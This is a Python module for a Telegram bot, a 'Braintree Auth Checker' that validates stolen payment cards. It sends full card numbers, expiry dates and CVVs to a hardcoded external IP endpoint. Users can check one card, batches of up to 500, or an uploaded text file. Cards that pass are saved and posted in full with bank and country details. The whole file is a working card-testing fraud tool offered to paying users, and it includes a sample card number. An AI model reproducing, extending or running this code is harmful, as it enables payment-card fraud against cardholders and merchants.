# bt_commands.py - Braintree Auth Checker

from telethon import events, Button
import asyncio
import aiohttp
import json
import time

# --- Globals ---
client = None
utils = {}
ACTIVE_MBTXT_PROCESSES = {}

# --- API URL ---
API_URL = "http://51.81.115.28:8000/bt/BRAINTREE/Braintree_Auth1.php?lista={card}"

# --- Core API Function ---
async def check_bt_api(card):
    """Checks card using Braintree Auth API"""
    try:
        url = API_URL.format(card=card)
        timeout = aiohttp.ClientTimeout(total=30)
        
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:
                if res.status != 200:
                    return {"status": "Error", "message": f"API HTTP Error {res.status}", "time": 0}
                
                response_text = await res.text()
                
                # Try to parse as JSON first
                try:
                    data = json.loads(response_text)
                    status = data.get("Status", "Unknown")
                    response = data.get("Response", "No response")
                    
                    # Clean up response - remove extra codes
                    import re
                    # Remove patterns like (63 : NOT ENTITLED), (2038:...), etc.
                    response = re.sub(r'\s*\(\d+\s*:\s*[^)]+\)', '', response)
                    # Remove leading numbers and colons like "2038: "
                    response = re.sub(r'^\d+:\s*', '', response)
                    response = response.strip()
                    
                    # Parse status - use exact API response
                    if "Approved" in status or "✅" in status:
                        return {"status": "Approved", "message": response, "time": 3.5}
                    elif "Declined" in status or "❌" in status:
                        return {"status": "Declined", "message": response, "time": 3.5}
                    else:
                        return {"status": status, "message": response, "time": 3.5}
                
                except json.JSONDecodeError:
                    # If JSON fails, try to extract from HTML/text
                    import re
                    
                    # Extract Status
                    status_match = re.search(r'"Status":"([^"]+)"', response_text)
                    status = status_match.group(1) if status_match else "Unknown"
                    
                    # Extract Response
                    response_match = re.search(r'"Response":"([^"]+)"', response_text)
                    response = response_match.group(1) if response_match else "No response"
                    
                    # Clean up response
                    response = re.sub(r'\s*\(\d+\s*:\s*[^)]+\)', '', response)
                    response = re.sub(r'^\d+:\s*', '', response)
                    response = response.strip()
                    
                    # Parse status
                    if "Approved" in status or "✅" in status:
                        return {"status": "Approved", "message": response, "time": 3.5}
                    elif "Declined" in status or "❌" in status:
                        return {"status": "Declined", "message": response, "time": 3.5}
                    else:
                        return {"status": status, "message": response, "time": 3.5}
    
    except asyncio.TimeoutError:
        return {"status": "Error", "message": "Request Timed Out", "time": 0}
    except Exception as e:
        return {"status": "Error", "message": str(e), "time": 0}

# --- Single Check (/bt) ---
async def process_bt_card(event):
    """Processes a single card check for /bt command."""
    card = utils['extract_card'](event.raw_text)
    if not card and event.is_reply:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text:
            card = utils['extract_card'](replied_msg.text)
    
    if not card:
        return await event.reply("⚠️ **Wrong Format!**\n\n**Command:** `/bt card|mm|yy|cvv`\n**Example:** `/bt 4779105005866536|04|28|949`\n\n🔥 Reply to card info to check instantly.")

    # Get username
    user = await event.get_sender()
    username_tg = user.first_name if user.first_name else "User"
    
    # Live progress animation
    loading_msg = await event.reply(f"""⍟━━━⌁ **CHECKING** ⌁━━━⍟

[🝂] **CARD** ⌁ {card[:6]}●●●●●●{card[-4:]}
[🝂] **GATE** ⌁ Braintree Auth
[🝂] **RESPONSE** ⌁ Checking ■□□□

[🝂] **CHECKED BY** ➺ {username_tg} [PREMIUM]""")
    
    start_time = time.time()
    
    # Update progress
    await asyncio.sleep(0.5)
    try:
        await loading_msg.edit(f"""⍟━━━⌁ **CHECKING** ⌁━━━⍟

[🝂] **CARD** ⌁ {card[:6]}●●●●●●{card[-4:]}
[🝂] **GATE** ⌁ Braintree Auth
[🝂] **RESPONSE** ⌁ Checking ■■□□

[🝂] **CHECKED BY** ➺ {username_tg} [PREMIUM]""")
    except: pass
    
    await asyncio.sleep(0.5)
    try:
        await loading_msg.edit(f"""⍟━━━⌁ **CHECKING** ⌁━━━⍟

[🝂] **CARD** ⌁ {card[:6]}●●●●●●{card[-4:]}
[🝂] **GATE** ⌁ Braintree Auth
[🝂] **RESPONSE** ⌁ Checking ■■■□

[🝂] **CHECKED BY** ➺ {username_tg} [PREMIUM]""")
    except: pass

    res = await check_bt_api(card)
    elapsed_time = round(time.time() - start_time, 2)
    
    brand, bin_type, level, bank, country, flag = await utils['get_bin_info'](card.split("|")[0])
    
    status = res.get("status")
    if status == "Approved":
        await utils['save_approved_card'](card, "APPROVED (BT)", res.get('message'), "Braintree Auth", "N/A")
        msg = f"""⍟━━━⌁ **APPROVED** ⌁━━━⍟

[🝂] **CARD** ⌁ {card}
[🝂] **STATUS** ⌁ Approved ✅
[🝂] **GATE** ⌁ Braintree Auth
[🝂] **RESPONSE** ⌁ {res.get('message')}

━━━━━━━━━━━━━━━━━
[🝂] **INFO** ⌁ {brand} - {bin_type} - {level}
[🝂] **BANK** ⌁ {bank}
[🝂] **COUNTRY** ⌁ {country} {flag}
━━━━━━━━━━━━━━━━━

[🝂] **TIME** ⌁ {elapsed_time}s
[🝂] **CHECKED BY** ➺ {username_tg} [PREMIUM]"""
    else:
        msg = f"""⍟━━━⌁ **DECLINED** ⌁━━━⍟

[🝂] **CARD** ⌁ {card}
[🝂] **STATUS** ⌁ Declined ❌
[🝂] **GATE** ⌁ Braintree Auth
[🝂] **RESPONSE** ⌁ {res.get('message')}

━━━━━━━━━━━━━━━━━
[🝂] **INFO** ⌁ {brand} - {bin_type} - {level}
[🝂] **BANK** ⌁ {bank}
[🝂] **COUNTRY** ⌁ {country} {flag}
━━━━━━━━━━━━━━━━━

[🝂] **TIME** ⌁ {elapsed_time}s
[🝂] **CHECKED BY** ➺ {username_tg} [PREMIUM]"""
    
    await loading_msg.delete()
    await event.reply(msg)

# --- Mass Check (/mbt) ---
async def process_mbt_cards(event, cards):
    """Processes multiple cards for /mbt command."""
    # Initial progress message
    sent_msg = await event.reply(f"""⍟━━━⌁ **MASS CHECKING** ⌁━━━⍟

[🝂] **PROGRESS** ⌁ □□□□□□□□□□ 0/{len(cards)}
[🝂] **GATE** ⌁ Braintree Auth
[🝂] **STATUS** ⌁ Starting...

✅ **Approved:** 0
❌ **Declined:** 0""")
    
    approved_count = 0
    declined_count = 0
    all_results = []
    approved_cards = []
    checked = 0
    
    for card in cards:
        checked += 1
        res = await check_bt_api(card)
        status = res.get("status")
        message = res.get("message")
        brand, bin_type, level, bank, country, flag = await utils['get_bin_info'](card.split("|")[0])
        
        status_emoji = "✅" if status == "Approved" else "❌"
        
        if status == "Approved":
            approved_count += 1
            await utils['save_approved_card'](card, "APPROVED (BT)", message, "Braintree Auth", "N/A")
            all_results.append(f"{card}|{message}\n{brand} - {bin_type} - {level}\n{bank}\n{country} {flag}")
            approved_cards.append((card, message, brand, bin_type, level, bank, country, flag))
        else:
            declined_count += 1
            all_results.append(f"{card}|{message}\n{brand} - {bin_type} - {level}\n{bank}\n{country} {flag}")
        
        # Update progress
        progress_percent = int((checked / len(cards)) * 10)
        progress_bar = "■" * progress_percent + "□" * (10 - progress_percent)
        
        try:
            await sent_msg.edit(f"""⍟━━━⌁ **MASS CHECKING** ⌁━━━⍟

[🝂] **PROGRESS** ⌁ {progress_bar} {checked}/{len(cards)}
[🝂] **CURRENT** ⌁ {card[:6]}●●●●●●{card[-4:]}
[🝂] **RESPONSE** ⌁ {message[:30]}...
[🝂] **STATUS** ⌁ {status} {status_emoji}

✅ **Approved:** {approved_count}
❌ **Declined:** {declined_count}""")
        except:
            pass
        
        await asyncio.sleep(0.5)
    
    # Create summary message
    summary = f"""✅ **Mass Check Complete!**

📊 **Results:** {len(cards)} cards checked
✅ **Approved:** {approved_count}
❌ **Declined:** {declined_count}
⏱️ **Time:** {len(cards) * 4}s

Gate: Braintree Auth"""
    
    try:
        await sent_msg.edit(summary)
    except:
        await event.reply(summary)
    
    # Send detailed results
    if all_results:
        cards_text = "\n\n".join(all_results)
        max_length = 3800
        if len(cards_text) < max_length:
            try:
                await event.reply(f"```{cards_text}```")
            except:
                await event.reply(cards_text[:4000])
        else:
            # Split into chunks
            chunks = []
            current_chunk = ""
            for result in all_results:
                if len(current_chunk) + len(result) + 2 < max_length:
                    current_chunk += result + "\n\n"
                else:
                    chunks.append(current_chunk)
                    current_chunk = result + "\n\n"
            if current_chunk:
                chunks.append(current_chunk)
            
            for i, chunk in enumerate(chunks):
                try:
                    await event.reply(f"```Results {i+1}/{len(chunks)}:\n\n{chunk}```")
                except:
                    await event.reply(f"Results {i+1}/{len(chunks)}:\n\n{chunk[:4000]}")
    
    # Send individual approved cards with anime GIF
    user = await event.get_sender()
    username_tg = user.first_name if user.first_name else "User"
    
    for card, message, brand, bin_type, level, bank, country, flag in approved_cards:
        # Get anime GIF
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("https://api.waifu.pics/sfw/dance") as gif_res:
                    if gif_res.status == 200:
                        gif_data = await gif_res.json()
                        gif_url = gif_data.get("url")
                    else:
                        gif_url = None
        except:
            gif_url = None
        
        approved_msg = f"""⍟━━━⌁ **APPROVED** ⌁━━━⍟

[🝂] **CARD** ⌁ {card}
[🝂] **STATUS** ⌁ Approved ✅
[🝂] **GATE** ⌁ Braintree Auth
[🝂] **RESPONSE** ⌁ {message}

━━━━━━━━━━━━━━━━━
[🝂] **INFO** ⌁ {brand} - {bin_type} - {level}
[🝂] **BANK** ⌁ {bank}
[🝂] **COUNTRY** ⌁ {country} {flag}
━━━━━━━━━━━━━━━━━

[🝂] **TIME** ⌁ 3.5s
[🝂] **CHECKED BY** ➺ {username_tg} [PREMIUM]"""
        
        if gif_url:
            await event.reply(file=gif_url, message=approved_msg)
        else:
            await event.reply(approved_msg)

# --- Register Handlers ---
def register_handlers(telegram_client, utility_functions):
    global client, utils
    client = telegram_client
    utils = utility_functions
    
    @client.on(events.NewMessage(pattern=r'^[/.!]bt'))
    async def bt_command(event):
        can_access, access_type = await utils['can_use'](event.sender_id, event.chat)
        if not can_access:
            message, buttons = (utils['banned_user_message'](), None) if access_type == "banned" else utils['access_denied_message_with_button']()
            return await event.reply(message, buttons=buttons)
        asyncio.create_task(process_bt_card(event))
    
    @client.on(events.NewMessage(pattern=r'^[/.!]mbt'))
    async def mbt_command(event):
        can_access, access_type = await utils['can_use'](event.sender_id, event.chat)
        if not can_access:
            message, buttons = (utils['banned_user_message'](), None) if access_type == "banned" else utils['access_denied_message_with_button']()
            return await event.reply(message, buttons=buttons)
        
        replied_msg = await event.get_reply_message() if event.is_reply else None
        cards = utils['extract_all_cards'](replied_msg.text if replied_msg and replied_msg.text else event.raw_text)
        
        if not cards:
            return await event.reply("⚠️ **No Cards Found!**\n\n**Usage:** `/mbt card1|mm|yy|cvv card2|mm|yy|cvv`\n\nOr reply to a message containing multiple cards.")
        
        if len(cards) > 500:
            original_count = len(cards)
            cards = cards[:500]
            await event.reply(f"⚠️ **Limit Reached!**\n\n📊 Processing first **500** cards out of **{original_count}** provided.\n🔥 Max limit: **500 cards**")
        
        asyncio.create_task(process_mbt_cards(event, cards))
    
    @client.on(events.NewMessage(pattern=r'^[/.!]mbtxt'))
    async def mbtxt_command(event):
        can_access, access_type = await utils['can_use'](event.sender_id, event.chat)
        if not can_access:
            message, buttons = (utils['banned_user_message'](), None) if access_type == "banned" else utils['access_denied_message_with_button']()
            return await event.reply(message, buttons=buttons)
        
        replied_msg = await event.get_reply_message()
        if not replied_msg or not replied_msg.document:
            return await event.reply("⚠️ **No File Detected!**\n\nReply to a .txt file containing cards with `/mbtxt`")
        
        try:
            file_path = await replied_msg.download_media()
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            cards = utils['extract_all_cards'](content)
            if not cards:
                return await event.reply("⚠️ **No valid cards found in file!**")
            
            if len(cards) > 500:
                original_count = len(cards)
                cards = cards[:500]
                await event.reply(f"⚠️ **Limit Reached!**\n\n📊 Processing first **500** cards out of **{original_count}** provided.\n🔥 Max limit: **500 cards**")
            
            asyncio.create_task(process_mbt_cards(event, cards))
            
            # Clean up downloaded file
            import os
            if os.path.exists(file_path):
                os.remove(file_path)
        except Exception as e:
            await event.reply(f"❌ **Error reading file:** {str(e)}")
    
    print("✅ Successfully registered BT commands.")
